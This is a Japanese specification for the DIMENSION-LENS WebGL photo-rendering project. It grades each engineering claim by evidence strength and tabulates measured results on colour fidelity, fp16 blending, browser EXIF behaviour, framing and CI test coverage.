# DIMENSION-LENS 仕様書

> 版: **Phase 2a 時点**（G9 の決着と測定基盤 —— [#16](https://github.com/ops324/dimension-lens/pull/16) /
> [#18](https://github.com/ops324/dimension-lens/pull/18) マージ済み）
> **Gecko も `applied` だった** ── 4 実装すべてでデコーダが向きを適用済み。1c の最後の宿題が閉じた（§4.12）。
> 公開: <https://ops324.github.io/dimension-lens/> —— **標本 No.0 が描かれている。**
> `dimLevel = 2` の板経路は忠実性ラダーを ΔE00 **0.0000** で通っている（§7.6）。
> **`dimLevel = 0` の予算超過は閉じた**（ΔE00 4.3228 → **0.1744**）。欠損は 1 つの機構ではなく
> **2 つの積**で、大きい方（**−13.08%**）は絵ではなく**測定の定義**の産物だった ──
> 図の中心は drawingBuffer の (W/2, H/2) にあり、DPR 2 では常に**画素の角**なので、
> **値が定義されている点にフラグメントが無い**（§7.7）。
> **ブラウザ測定に自動ゲートが無い、は偽だった** ── `npm run ladder` が **68 行**を実 GPU で採点し、
> `npm run ladder:teeth` が**そのラダー自身**に歯を付ける（§7.9）。
> **自前回転は書かなかった** ── 3 実装 × Orientation 1〜8 = 24 セルすべてでデコーダが適用済み（§4.12）。
>
> **Phase 2b: 加算合成の残差は fp16 の「0 方向への切り捨て」だった**（§4.6 訂正 5）──
> 作品を通さない器具（`blendProbe`）が、立てた 3 仮説をすべて反証して 4 つ目を選んだ。
> 副産物として §4.6 の予算表が **1.8 倍甘かった**ことが分かった。
> そして **`prefers-reduced-motion` は 1 画素も変えていなかった** ── 未計測ではなく**偽**。
> **`CompressPass` は 3 フェーズにわたって配線されていなかった。**

---

## 0. 到達水準 —— この文書で最初に読むべき表

姉妹作 dimension の §14.1 に倣い、**主張を証拠の強さで採点する**。混ぜて書かない。

| 水準 | 意味 |
|---|---|
| **A** | 実測した。数値がこの文書か PR にある |
| **B** | 機構を確認した（ソースを追った・代数的に確定した）が、走らせていない |
| **C** | 未検証。そう考えているだけ |

C を C と書けることがこの作品の品質であって、C を A の書式で書かないことがその中身である。

**水準は3つしかない。** 「A に近い B」のような中間を作らない ── 一度作ってしまい、
Phase 0 の表に残っていた（GPU 経路の行）。中間を許すと、格付けは
「どれくらい自信があるか」の表明に堕ち、証拠の強さを表さなくなる。
判断（decision）と測定（measurement）が混ざったときは、**測定を A として書き、
判断は B として、覆る条件を添えて別に書く**。

### 0.1 表を正直に保つための規律

この表は、書く側が次の 9 つをやらない限り機能しない。**実際に全部を破ったことがあり**、
その結果 Phase 0 の計画には事実誤認が 4 件混入した（§4.4 / §4.5 がその記録）。

（**この行自身が長らく「次の 6 つ」と書いていた** ── 1c が 2 つ足したときに数を直さなかった。
§0.1 の見出しが §0.1 の中身について嘘をついていたわけで、
「Phase 0 時点の到達水準」の見出しが取り残されていたのと同じ型である。Phase 2a で直した。）

1. **ライブラリ内部の挙動を書く前に `node_modules` を開く。** 行番号まで引用できないなら、
   それは B ではなく C。
2. **ツールのバージョンを書く前に API を叩く。** 「最新」「古い」「直せない」は確認してから言う。
   特に**「〜だから直せない」という否定形の断定**は、確認せずに書くと相手の時間を奪う。
3. **サブエージェントの報告は、検証すべき仮説であって確定した事実ではない。**
   監査が `Texture.js:48` と言っても、自分の主張として書く前に自分で開く。
   実際、§4.5 の誤りは Plan エージェントの報告をそのまま採用したことが発端だった。
4. **測っていない数を、測った数の書式で書かない。** 見積もりなら見積もりと書くか、
   20 行のベンチを書いて測る（Phase 0 のティア表がこれで C から A になった）。
5. **姉妹リポジトリからの複製は「そのまま使える」を意味しない。** 設定ファイルは特に、
   バージョンと前提を再確認する（§7.4）。
6. **自分の設計が主張する性質は、自分で確かめる。** 代数なら最後まで展開する、実装なら測る。
   軸ごと正規化のまま「(3,4) は色相回転」と書いていたのは、外部ではなく自分の誤りだった。
7. **予算は測ってから書く。そして緩い方に外していないかを機械に確かめさせる。**
   Phase 1c で 2 回、測らずに予算を書いて落とした（P3 の色相差・退化境界の `sC`）。
   落ちたのは**厳しすぎる方に外したときだけ**で、緩すぎれば永久に緑だった ──
   だから `npm run teeth` が「守っているはずのものを壊して、本当に落ちるか」を毎回試す（§7.9）。
8. **「測れない」と書く前に、測る手段が無いことを確かめる。**
   §0 は長らく「Safari の EXIF は**この環境では測れない**」と書いていたが、
   `/Applications/Safari.app` は最初から在った。**測定の限界と、確認していないことは違う。**
   Phase 2a で同じことをもう一度踏んだ ── §7.9 の「ブラウザ測定の自動化は別の仕事で、
   まだ誰もやっていない」は文としては正しかったが、**費用を書かなかったので限界として読まれた**。
   実際には `playwright-core` とシステムの Chrome で足り、G9 はその空白の中で 2 フェーズ腐った。
9. **測る道具にも歯を付ける。そして推定器の窓は、答えが通るまで詰めるのではなく機構から導く。**
   §7.9 の `npm run teeth` が閉じたのは「**テストが恒等に潰れる**」経路だけで、
   「**測定器が最初から何も見ていない**」経路は開いたままだった ── 実際、Phase 2a の
   ラダー初版は G9 の行の判定に `true` をベタ書きしており、永久に ✅ を返した（§7.9）。
   窓についても同じ形の誘惑がある: 雲経路のランプが ΔE00 2.77 で落ちたとき、
   窓を数画素ずらせば通った。**それは予算を緩める代わりに測る場所を動かす行為**である。
   窓は `discard` 半径から計算し、計算した窓が空になったら「測れない」と報告する（§7.6）。

**主張をテストに変換できるものは変換する** ── `privacy.test.ts` も `vendor.test.ts` も、
文書中の約束を機械が見るものへ移し替えたものである。表の行が増えるより、
テストが増えるほうが望ましい。

### 到達水準（Phase 2a 時点）

**この見出しは一度「Phase 0 時点の到達水準」のまま取り残された** ── 中身は Phase 1a-i の
実測（スプライト定数・OKLab 行列・退化判定）を含んでいたので、見出しが表の内容について
嘘をついていた。表を正直に保つ規律（§0.1）は表の**外側**にも掛かる。

| 主張 | 水準 | 根拠 / 上げる方法 |
|---|---|---|
| 融合カーネル(展開版)が ULTRA 159,414点で **1.29 ms/frame** | **A** | `npm run bench`、下記 §4.3。Apple M1 Max / Node 24.13 |
| 展開版は一般版より **5.85倍**速い（→ 展開版を採る） | **A** | 同上 |
| 融合は素直な3パスより **4.56倍**速い | **A** | 同上 |
| 融合カーネル ≡ extent→rotateBatch→projectPerspective | **A** | `rotationN.test.ts`、6つの dimLevel で 1e-6 一致 |
| `composeRotN` ≡ `rotateBatch`（n=3..8） | **A** | 同、1e-12 一致 |
| n=5・dist=2.4 で透視カスケードが全段安全 | **A（単位球内）／実画像では偽** | `rotationN.test.ts` は単位球内の点で max ratio < 0.75。**しかし実際に持ち上げた標本 No.0 は maxNorm = 1.5074** で、必要条件 dist > 2·maxNorm = 3.015 を満たさない（§4.9）。`safeDist()` で対処 |
| **スプライト定数 F=21 / kSprite=3.85 が平坦場を再構成する** | **A** | 平坦場リップル **0.69%**（設計当初の F=6/k=1.7 は **44.7%**）。§4.10 |
| **退化判定が実際に発火する** | **A** | グレースケール標本で `chroma.degenerate === true`。ヒストグラム経由なら p95=0.01218 で**絶対に発火しない**（§2.2） |
| **色相不変性（本作の看板）** | **A** | 実パイプラインの出力で彩度残差 **2.8e-17**、色相角残差 **8.9e-16**（予算 1e-12）。軸ごとスケールの反例も同テストで落ちることを確認 |
| **白が両原色で中性へ写る** | **A** | 白 → L=0.9999999935、a=**−1.7e-16**（正規化前 −1.0e-5）。§4.11 |
| `columnMeans` が正準バッファの列平均と一致 | **A** | `image.test.ts`。Phase 1b が使う前に固定した |
| フレーミングが帯に収まり、一辺に接する | **A（純関数）** | `fit.test.ts`、4 アスペクト × 3 viewport × 3 帯。実機は Phase 1a-iii |
| ΔE00 実装が公表テストペアと一致 | **A（部分）** | Sharma の 12 対で 1e-4。**全 34 対ではない** —— 記憶からの転記を避けた。残りを足す PR で水準が上がる |
| 移植した `math/*` の正しさ | **A（継承）** | 親の rotation/projection テストをそのまま再実行。`rotation.ts` を VERBATIM に保つ限り有効 |
| バンドルに通信 API が無い | **A** | `privacy.test.ts`、allowlist は空。**初回実行で vite の modulepreload ポリフィルの `fetch` を捕まえた**（§6.2） |
| CSP が本番ビルドに入り、`default-src`/`img-src`/`base-uri` を閉じている | **A** | 同（`dist/index.html` を検査） |
| CSP 下で自前の JS が実際に読める | **A** | preview(:4173) 実測。`data-lens="booted"`、`<script src="/assets/index-*.js">`、コンソールエラー 0 |
| CSP が fetch・**画像経由の送信**・WebSocket を実際に阻む | **A** | preview 実測。violation 3件（§6.3） |
| **公開経路が通っている** | **A** | GitHub Pages 実測（§7.3）。サブパス配信で `base: './'` が効き、CSP 下で JS が読め、コンソールエラー 0 |
| `Texture` 既定は `NoColorSpace` / `color_vertex` はデコードしない | **B** | `node_modules/three/src/textures/Texture.js:48` と `ShaderChunk/color_vertex.glsl.js` を自分で開いて確認。LENS では未実行 |
| `NeutralToneMapping` は恒等ではない | **A** | GLSL 実ソース + 数値実測（§4.5）。sRGB 128→**116**、63→**33**、200→**194** |
| half-float 加算の飽和天井は 0.03125 | **A だが 1 標本**（Phase 1b で訂正） | 正しい法則は「天井 = **2048·δ 以上の最小の 2 冪**」（15/15 一致）。0.03125 は δ≈1.5e−5 での値にすぎず、δ を 0.3% 動かすと 2 倍に跳ぶ。§4.6 |
| §4.6 の「`dimLevel=0` の平均色は約 3% 暗く出る」 | **偽**（Phase 1b で実測） | 符号が定まらない —— n=489 で **+2.92%**、n=512 で **−4.94%**、n=2048 で **+8.86%**。しかも n=489 は**取り違え**（ULTRA 格子の cols であって加算深度ではない）。§4.6 |
| **加算深度は点数ではなく被覆数である** | **A** | アンカー **16**／列平均線 **4**／完全な潰し **378**。格子のまま潰すと 89,208 で **−96.4%**（§4.6） |
| **ブラウザの縮小はガンマ空間平均** | **A**（Chrome 148） | 黒白2px→1px が **128**（リニア光平均なら 188）。`drawImage` と `createImageBitmap({resizeWidth})` の両方（§4.7）。**Phase 1a-ii で bitmap→bitmap 経路と `resizeQuality` 3 段でも再確認**。他ブラウザは未測定 |
| **EXIF の向きはデコーダから降りられない** | **A**（Chrome 148） | `imageOrientation:'none'` が既定と 1 ビットも変わらない。`<img>` も同じ。§4.12 |
| **だから LENS は画素を回さない**（二重適用の禁止） | **A** | 317B の probe が実行時に `'applied'` を返している。§4.12 |
| **Safari の EXIF 挙動** | **A**（Phase 1b までは「測れない」として C） | Safari 18.6 で本番の 317B probe が `'applied'`。Orientation **1〜8 の全値** × Chromium 148 / Chrome 150 / Safari 18.6 = **24 セルすべて適用済み**（§4.12）|
| **Firefox（Gecko）の EXIF 挙動** | **C → A**（Phase 2a・#18） | **Mozilla Firefox 152.0.6** で本番の 317B probe が **1×2** を返し `'applied'`。`imageOrientation:'none'` も既定と一致。ローカルには入れず、**GitHub の runner に在る実物**で 1 回開いた（§4.12）|
| **だから自前回転を書かない** | **B → A**（Phase 2a） | 覆る条件（Gecko が `'not-applied'` を返す）が**起きなかった**。測った **4 実装すべて**で到達不能な分岐である |
| **取り込みがメインスレッドを塞がない** | **A** | 24MP で最長遮断 **11.8 ms**（予算 16.7）。同じ仕事をメインでやると **88.0 ms**。§7.5 |
| **40MP がデスクトップで完走する** | **A**（Phase 1b では C） | 3 形状 × 3 回 = 9 標本すべて完走、最長遮断 **12.5 ms**（予算 16.7・アイドル床 6.9〜7.1 ms 併記）。§7.8 |
| **中間ピークのメモリ** | **C**（原理的に測れない） | `measureUserAgentSpecificMemory` は `crossOriginIsolated` を要求し、GitHub Pages はヘッダを設定できない。**`MAX_SOURCE_PIXELS` の門はデコード完了後に評価されるのでピークを防がない**（§7.8）|
| **取り込み各段の CPU** | **A** | `npm run bench`。正準 2048×2048（最悪）で linearize 17.53 / stats 26.26 / lift 16.93 ms。§4.14 |
| **正準バッファが worker に常駐する** | **A** | `relift` が再デコードなしで格子を引き直す。`ingest.test.ts` / 実機起動報告 |
| **`safeDist` が実際に配線されている** | **A**（Phase 1b までは**歯が無かった**） | `makeLiftPayload` を純関数へ出し、`robustness.test.ts` が §4.8 の必要条件 `dist > 2·maxNorm` を採点する。**1b まではリテラル 2.4 に置換しても 276 件が緑だった**（§7.9）|
| **worker を入れてもバンドルに通信 API が無い** | **A** | `privacy.test.ts`。dist 全走査で 8 種 0 件、`createObjectURL` も 0 件 |
| **CSP 下で same-origin worker が起動する / `blob:` worker は塞がれる** | **A** | preview 実測。violation の `effectiveDirective = worker-src`（§6.3） |
| **公開ページ上で取り込みが完走する** | **A** | GitHub Pages 実測。`data-lens-ingest="ok"`、worker チャンクがサブパスで解決、外向き 0、コンソールエラー 0（§7.3） |
| `worker-src` に `blob:` が要る | **偽**（Phase 0 の未検証な仮定） | 「vite の出力形式によっては要るかもしれない」で**確かめずに開けていた**。same-origin チャンクで足りる。§6.1 |
| Display P3 の入力経路 | **C（据え置き。1a-ii の「Phase 1c で通す」を撤回）** | 「4 箇所を揃えれば通る」が**偽** ── 揃えた構成が Chromium `[215,69,50]` / Safari `[234,51,35]` と実装で割れる。**現行の sRGB 固定だけが 2 実装で一致する**（§4.13）|
| **色域の配線が切れていたら落ちる** | **A**（1b では歯が 1 本も無かった） | 4 点すべて（`linearizeRgba` / `computeStats` / `lift` / `buildColumnLine`）を srgb 固定に壊すと落ちる。**1b では 4 つとも壊しても 276 件が緑**（§7.9）|
| **色域を取り違えたときの代償** | **A** | OKLab 色相が緑で **3.144°** ずれる ── **G4 の予算 0.5° の 6.3 倍**。青は 0.002° しか動かないので**色相は判定に使えない**（彩度は全色で 0.0099 以上ずれる）|
| **HEIC は Chrome で読めず Safari で読める** | **A** | 同一の 781B HEIC で Chromium 148 / Chrome 150 は `InvalidStateError`、**Safari 18.6 は 64×48 を返す**。だから事前に弾かず、**失敗したあとにマジックバイトで分類**する（§4.19）|
| **`dimLevel = 2` が「あなたの写真そのもの」** | **A**（Phase 1a まで C） | 板経路 ΔE00 **0.0000**（平坦・ランプ 8 段・ホイール 24 パッチのすべて）／雲経路 0.4217 以下。§7.6 |
| **アンカー窓で回転角が厳密に 0** | **A** | `rotationSchedule.test.ts` が `Object.is(角度, 0)`。窓を通過して戻っても位相が保存 |
| **板と点群の合成則**（和が厳密に 1） | **A** | アンカーで板 1・点群**厳密 0**。規定が無いと平坦部が 2 倍になる（§7.6 の G7） |
| **スプライト定数が実機で平坦場を再構成する** | **A**（GPU 実測） | 実効ゲイン誤差 **−1.682%**（予算 ±2%）。1a-i の A は CPU 上の格子和だった |
| **板の拡大補間がリニア光** | **A** | 黒白 2px の中点が sRGB **188**。ガンマ空間仮説との隔たりは ΔE00 **18.662**（§7.6 の G5） |
| ~~加算ブレンドが列平均そのものである~~ | **偽**（Phase 1b で実測） | 加算ブレンドが再構成するのは **2 次元格子の平坦場だけ**である。列に潰した瞬間に**列合計**になる（平坦場の **159.1 倍**）。正しい行 → 次 |
| **加算ブレンドは 2 次元格子の平坦場を再構成する** | **A**（1a-i では B） | composer の線形 HDR ターゲット上で。画面直描画なら飽和する。潰れた格子には `sampleWeight` が要る（§2.3） |
| clear color 漏れの機序 | **A**（1a-i では B・親の実測） | LENS でも再現。**トーンマップを切っているぶん親より悪い**（グレー軸で ΔE00 8.50）。黒固定で無害化 |
| **読み戻し経路が生きている** | **A** | `data-lens-capture="ok"`。既知の値を書いて読み返す自己検査が、絵より先に通る |
| **`InstancedBufferGeometry` の既定は絵を消す** | **A** | `instanceCount = Infinity` → 描画 0・GL エラー 0・drawCall 1（§4.15） |
| **`texture.flipY` は `ImageBitmap` に効かない** | **A** | `WebGLTextures.js:918-926`（§4.16） |
| **公開ページに絵が出ている** | **A** | GitHub Pages 実測。`data-lens-render="ok"`、コンソールエラー 0（§7.3） |
| bloom の閾値 | **A**（Phase 2a まで C） | 閾値 `0.28` は `d = 0` の目標リニア輝度 **0.265546** の **1.0544 倍**しかない ── **下げると G9 の測定点が bloom の内側に入る**。2b で定数を `core/bloom.ts` へ出し、`bloom.test.ts` が node で柵を張った。**（SPEC がこれまで書いていた 0.26665 / 1.0500 は誤り** ── あれは `srgbToLinear(141/255)`、つまり G9 が報告する**符号値の戻し**であって、平均色の Rec.709 輝度ではなかった） |
| bloom / grade の強度・半径 | **C（自覚あり）** | 親の Phase 11 の値のまま。2b は**触っていない** ── 触る根拠となる測定をまだ持っていないので、動かさないことが正しい（勝手に「改善」しない） |
| **加算合成の丸めモード** | **A**（Phase 2b・`blendProbe`） | fp16 で積み、**最近接ではなく 0 方向へ切り捨てる**。規定した 6 ケースすべてで厳密一致（`Object.is`）。持ち込んだ 3 仮説（f32 厳密 / fp16 最近接 / 非正規数ソースの切り捨て）は**すべて反証された** |
| ~~残差は fp16 の最近接丸めで説明でき、1% 未満~~ | **偽**（Phase 2b） | 監査のシミュレーションは最近接、実機は切り捨て。**最近接は不偏、切り捨ては片側にしか外れない** ── だから §4.6 の予算表は深度 512 で 1.364 ではなく **2.439** だった（1.8 倍甘かった） |
| **`d ≥ 3` の色に採点する行がある** | **A**（Phase 2a まで**行が 1 本も無かった**） | G12。幾何を固定して**色場だけ**差し替え、積分光量の重ね合わせ `I(A+B) = I(A) + I(B)` を見る。実測 **0.018〜0.021%**（予算 0.5%）。**幾何のモデルを 1 つも要求しない** |
| ~~`prefers-reduced-motion` に配慮している~~ | **偽**（2b で判明）→ **A** | 2a まで**1 画素も変えていなかった** ── `postfx.ts` の 1 行が握っていたのは既定オフの `gradePass` の `uTime` だけで、回転（`advancePhases`）には門が無かった。**未計測ではなく偽の主張**。2b で回転そのものを止め、ラダーが両側から見張る |
| **`CompressPass` が配線されている** | **A**（Phase 2a まで**呼ぶ者がいなかった**） | `setCompressStrength` の呼び出し元が 1 つも無く、出荷経路では `enabled = false` のままだった。2b で `rotationGate` から駆動。実測: 門が開くと **30,366 バイト**相違、HDR の峰が **1.469 → 0.969** |
| **`uKnee = 0.8`** | **A**（未計測のリテラルだった） | 親には `CompressPass` が無いので「継いだ値」ですらなかった。`readbackHDR` で分布を実測（p50 **0.216**）し、条件を満たしていることを確かめて**動かさない**。2c-i で**独立した柵と歯**を置いた ── それまでこの値を留めるテストは 1 本も無く、「代償を記録する」つもりの `toBeCloseTo(0.9062, 3)` が副作用で ±0.15% だけ固定していた |
| ~~位相まで掃いた HDR の包絡は **2.0176**~~ | **偽**（Phase 2c-i で実測） | あの掃引は**位相 0 の近傍**でしかなかった。`readbackHDR` を使う測定（G12 / G15）はどちらも `freezeRotation(true)` + `resetRotation()` を撃つ ── **位相を流して掃く測定は repo に 1 行も無かった**。正しい行 → 次 |
| **`d ≥ 3` の HDR の峰（位相を流した実測）** | **A**（2b までは位相 0 のみ） | `d = 3` で **101.0**、`d = 4.25` で **266.75**（記録値の 50 倍 / 132 倍）。機構は `framingHold` が距離を固定したまま図が前縮みすること（`fill.x` 0.86 → **0.0303**）。**距離が飽和した後も `fill.x` は下がるので framingHold を直しても消えない**（§4.20）|
| **圧縮がクリップを起こさない** | **A**（2b は **B**・測定依存） | 有限の設計峰では上限 `k + 1/s` が**常に 1 を超える**（代数）。`PEAK_MARGIN = 1.25` は上限を 1.02628 にしていただけで、実測の峰は 255 に張り付いていた（1.0 超が 2,000〜3,700 px）。`s = 1/(1−k)` の極限を直接置き、`[k,∞) → [k,1)` の全単射にした ── **包絡の測定にも機体にも依存しない**（§4.21）|
| **位相は閉軌道である** | **B**（代数で確定） | `θ_k = ω_k·s` と 1 個のスカラの像なので、到達集合はトーラス全体ではない。`ω×1000 = (110,70,50,30,23)` の gcd が 1 → 周期 **2000π ≈ 6283 秒**。2b の「位相は無限に流れ続ける」は**偽**だった（§4.20）|
| **dimLevel > 2 でのフレーミング** | **A**（Phase 1a-iii では C） | `needDistance`（`zHi` を含む一般化）+ ピークホールド。4 種の viewport × dimLevel 0〜5 × 位相 20 点で**帯を割らない**（最大充填 0.86）。§7.7 |
| ~~構図は `dimLevel` で決まる~~ | **偽 → A**（Phase 2c-ii で直した） | ピークホールドなので**構図は経過時間の関数**だった ── `d = 3` で 140 秒かけて 2.9682 → **6.0446**（2.04 倍 ＝ 見かけの大きさが約半分）。押していたのは横幅ではなく `zHi`（峰の瞬間の `aX` は 0.305）。**`d ≠ 2` の測定値が「そこに何秒いたか」で変わっていた**（§4.22）|
| **構図が `(画像, dimLevel, viewport)` の関数である** | **A**（Phase 2c-ii。**2c-ii の実装では resize 1 回で失われていた**） | 到達しうる広がりを先に計算して最初から置く。実測: 門が全開なら `d = 3` で **18,000 フレーム回して 1 ビットも動かない**。ただし 2c-ii は引き直しを `if (dimChanged)` で囲っており、`layout()` が包絡を 0 にしたあと二度と引き直さなかった → 次行（§4.22）|
| ~~包絡は配線されている~~ | **偽 → A**（Phase 2c-iv で直した） | `layout()` は `positions` 無しで `updateCamera(true)` を呼ぶので包絡を 0 にする枝を通り、直後の `update()` は `dimLevel` が動いていないので**引き直さない**。`relayout()` は `engine.onResize` に配線されているので**リサイズ 1 回で必ず踏む**。実測（`d=3`）: 6.869252 → 直後 **2.558621** → 300 秒 6.044646（まだ登り中）。**「配線されている」と「配線が生き続ける」は別の主張だった**（§4.22）|
| ~~図が帯を出ないのは `framingHold` のおかげ~~ | **偽**（Phase 2c-iv・代数と実測） | 担っているのは**毎フレームの実測 `spread`** である。`updateCamera` は `liftProject5` が**これから描くフレームの**位置を書いた直後に呼ばれ、`framed = unionSpread(spread, target) ≥ spread`、`needDistance` は各成分について単調 ⇒ `ndc ≤ DEFAULT_FILL` が**等号成立**。実測 **約 39 万フレーム**（遷移／定常／無作為跳躍／退化／3 ティア）で最大は厳密に **0.86000000**。スプライト半径込みでも 0.874。**ホールドが守っているのは「呼吸しないこと」だけ**（§4.22）|
| ~~極値を取るのはノルム最大の一握りの点である~~ | **偽**（Phase 2c-iv・実測） | 単調性の命題は「ノルム r の点が**出しうる**半径の上界」であって argmax の主張ではない。No.0・M=512 で `d ≥ 2.5` の**位相の 54〜74% が上位 32 の外に argmax を持つ**（外したときの比は 0.00% まで落ちる）。一般には候補 32 が不足（`need` 比: 1024×64 横長 `d=5` で **91.572%**、1 行画像 91.119%、**普通のアスペクト**の色相スイープでも 98.465%）。割れる条件は「**ノルム分布の上が平ら**」（§4.22）|
| ~~隣接スロットの max だから安全側~~ | **偽**（Phase 2c-iv・実測と代数） | 単調性の**仮定**だった。反例（M=65536 で雑音と分離）: グレースケール勾配の `aY` が −0.977%、1 行画像の `zHi` が **−30.1%**。`envelopeFor` が厳密値を下回る点が **46/1001**（最悪 4.49%）・**48/1001**（最悪 4.60%）。代数でも言えない（理由 4 つを §4.22）|
| **`ENVELOPE_PHASES = 4096` は足りている** | **A**（2c-ii は `d=3` の 1 点のみ） | 標本 4 種 × 全 dimLevel・収束基準 M=262144 で測り直した。最悪 **99.649%**（1 行画像 `d=3`）、不足は最大 0.35% で候補選抜の 8.9% より 1 桁小さい。**ここに予算を足す優先度は低い**（§4.22）|
| ~~包絡は実際に包絡している~~ | **不足 → A**（Phase 2c-vii で実測） | `framingEnvelope.test.ts` が自ら「4 が本体」と書く主張は **`d = 3` の 1 点 × 40 位相の 1 セル**しか測っていなかった。`d` を 21 スロット・位相を 100 本へ広げると最悪 **100.124%（`d=1.75`）**、400 位相で 100.326%（`d=2.75`）── **包絡は超えられる**。柵 2% は割らないので主張は真で、狭かったのは掃引。しかも **`d = 3` は全開域で唯一 36,000F 回しても 1 ビットも動かない点**だった（§7.10 の型 2）|
| ~~`n ≤ 512` の破れは 3 ティア共通~~ | **標本依存 → A**（Phase 2c-vii で実測） | 最大深度 `4 × rows` は**アスペクトが決める**。標本 No.0 系は 628 / 944 / 1260 で破れるが、**横長 1024×64 は 196 / 296 / 400**、**1 行画像 1024×1 は 24 / 36 / 48** で **3 ティアとも 512 以下**。§4.6.1 の主張は標本 No.0 のアスペクトについてのものだった（`specimen.test.ts`）|
| ~~「帯を割らない」を掃引で確かめている~~ | **恒真だった → A**（Phase 2c-vii で実測） | `needDistance = zHi + fitDistance(aX,aY)` なので `held ≥ need` を代入すると `ndcExtents` の分母から `zHi` が約分され、商は `fitDistance` の定義から厳密に `DEFAULT_FILL`。`spread` を一様乱数にして **50 万点**通しても最大 **0.860000000000000431**、`held = need` では **200,000/200,000 点**で厳密一致。**点ごとに割る形に直しても消えない**（任意の点で `held − p.z ≥ fitDistance`）。→ 不等式をやめて恒等式として留めた（§7.10 の型 2）|
| ~~候補選抜の反例は実測されている~~ | **出所なし → A**（Phase 2c-vii で判明） | 上の行が引く「1024×64 横長」「1024×1 1 行」「1024×640 色相スイープ」の 3 標本は **repo に 1 バイトも存在しなかった**。過去の作業でその場で作られ、**数字だけが残っていた** ── 誰も検算できない。独立監査が同名の標本を作ると 46/1001・−4.49% に対し **4/1001・−0.971%** と桁が違う（別物を測ったため）。→ `SPECIMEN_LEDGER` に 6 枚を実装した。**古い表の数字は復元できない**ので、台帳で測り直すまで出所を持たない（§7.10 の型 3。数字の出所そのものは型 5・2c-viii）|
| 門の途中の帯の後退 | **A（予算なし・二律背反）** | 2c-ii は上側 `(2.1, 2.45)` だけを書いていたが、**下側 `(1.55, 1.9)` も同じ**（Phase 2c-iv）。実測（18,000 フレーム＝ 5 分）: `d=2.20` は 679F（11.3 秒）で動き出し 300 秒に **×1.354**、`d=1.80` ×1.266、`d=2.30` ×1.097、`d=1.65` ×1.050。門が全開なら厳密にゼロ（§4.22）|
| ~~歯の台帳の本数はラチェットである~~ | **偽**（Phase 2c-viii・全走査） | 期待本数のリテラルは repo に **0 件**で、`teeth.mjs` は `targets.length` を印字するだけだった ── **台帳から変異を削っても何も赤くならない。** しかもこの一文は「複製を入れてはいけない」という**正しい結論の理由として**書かれていた ── **結論が正しいと理由は検算されない。** `EXPECTED_MUTATIONS` と複製検査を置いた（§7.9.2.2）|
| ~~`observed` は全 53 本に埋まっている~~ | **52 / 53 → A**（Phase 2c-viii で実測） | 埋め残しの 1 本は**補完した 2c-vii 自身が同じ PR で足した変異**だった。補完が「既存の台帳を舐める」形だったので、追加行がその外に在った。`observed` を持たない変異が 1 本でも在れば走る前に落ちるようにした |
| ~~件数が減っても警告でよい（意図として明記）~~ | **代償を実測して撤回**（Phase 2c-viii） | 意図が書かれていることと、その意図が正しいことは別だった。**記録された教訓（「標本を 1 枚しか通さない測定は『測った』と書けない」）を撤回しても 7 点のゲートが 1 つも赤くならない**（`npm test` 430 緑・`teeth` EXIT=0・歯 4 → 3）。`failed < observed` を赤にした |
| ~~予算の歯は `6 / 19` で数えられている~~ | **分母に歯が無かった → A**（Phase 2c-viii） | `sites` は `gauge` を持つ行からしか作られないので、**歯の無い 13 site の `gauge` を消すと `6 / 19` が `6 / 6` になり判定は `true` のまま**通る。**指標が証拠を消すほど良くなるのは指標の側の欠陥である。** `EXPECTED_BUDGET_SITES` を置いた（実機で 19 を確認）|
| ~~CI が緑なら 7 点のゲートが走っている~~ | **偽**（Phase 2c-viii・run の実測） | `concurrency.group` が `pages` だけで **ref を含んでいなかった**ので、**別ブランチを push しただけで走行中の run が cancel される**。実測: #37 の run は `npm run teeth` の途中 22:25:01 に消え、#38 の run の開始は **22:24:48**（13 秒後）。**`gh pr checks` は `fail` と出るが conclusion は `cancelled` で、ゲートは 1 つも走っていない ── 「赤いが中身が無い」。** 履歴では **2c-vii でも 2 本が cancelled のまま**だった。**実装 PR と文書 PR を分ける運用（§8）は、この設定と組み合わさると分けるほど確実に踏む。** `pages-${{ github.ref }}` にした |
| ~~掃引の国勢調査は掃引を数えている~~ | **行数だけ → A**（Phase 2c-viii で実測） | 幅を縮める変異（標本 2 → 1・水準 9 → 2・viewport 4 → 1・ランプ 9 → 2）が **4 通りとも数字を 1 つも動かさずに緑で通った**。さらに国勢調査は**自分の説明コメントを掃引として 1 本数えていた**（完全列挙 156 → 155）。点集合の規模の台帳を置いた |
| ~~収束表は `viewportAspect` に依らない~~ | **偽**（Phase 2c-viii で実測） | `6.8693` 等が再現するのは **`viewportAspect ≥ 1.27`** で、`lensScene` の既定は **1**。そこでは「**`d = 1.25` が最悪**」が **`d = 3` へ反転する**（99.707%）。`framingEnvelope` 自身は aspect を知らず、効くのは `needDistance` だけ ── **出所は健全で、省かれていたのは前提である**（§7.10 の型 5）|
| ~~×1.354 が傾斜帯の代償である~~ | **不足 → A**（Phase 2c-vii で実測） | **×1.354 は飽和値ではなく 300 秒時点の値だった。** 600 秒（36,000F）まで回すと `d=2.20` は **×1.4035**、`d=1.80` ×1.3234。さらに **`d=2.375` の初動は 27,554F（459 秒）**で 18,000F の窓の外に在る ── 既存の掃引はこの点を「動かない」側に分類しうる。挙動そのものは意図どおり（`lensScene.ts` が明記）で、狭かったのは掃引（§7.10 の型 2）|
| **据え置きが実際に破綻していた** | **A** | `imageHalfExtents` のままだと `d=3` で帯を **1.5 倍超**はみ出し、viewport アスペクト 1.6 以上で**点がカメラを越える**。`F_CLAMP` 不発火・GL エラー無し（§7.7） |
| **`sampleWeight` の定義** | **A**（Phase 1a まで定義なし） | SPEC にも実装にも定義が無く、`main.ts` がリテラル 1 を返していた。§2.3 で定義し、実測で固定した |
| ~~潰しの忠実性（`[0,5]` 全域）が予算内~~ | **偽**（1c で実測）→ **A**（2a で閉じた） | 1c は `d=0` で ΔE00 **4.3228**（予算 3.0）。2a で **0.1744** へ。下 2 行が機構 |
| **`d = 0` の中心が `stats.meanHex` である** | **A** | 再構成した中心値 **141,141,142** = 目標 141,141,142（ΔE00 **0.1744** / 水準 −0.02%）。§7.7 |
| **同上を、モデルを通さずに確認した** | **A** | drawingBuffer を **741×585**（奇数×奇数）にすると位相が厳密 0 になり、峰は単一画素で**生値が 141,141,142**。割り算が 1 回も出てこない（§7.7 の G9z）|
| **潰しの忠実性（`d ≥ 0.5`）** | **A** | `d=1` ΔE00 **0.2912**（水準 −0.84%）、`d=0.5` **0.3649**（−0.55%）。**1b/1c の 0.1234 / 0.1528 とは推定器が違う**（下の「再現できない記録」の行）|
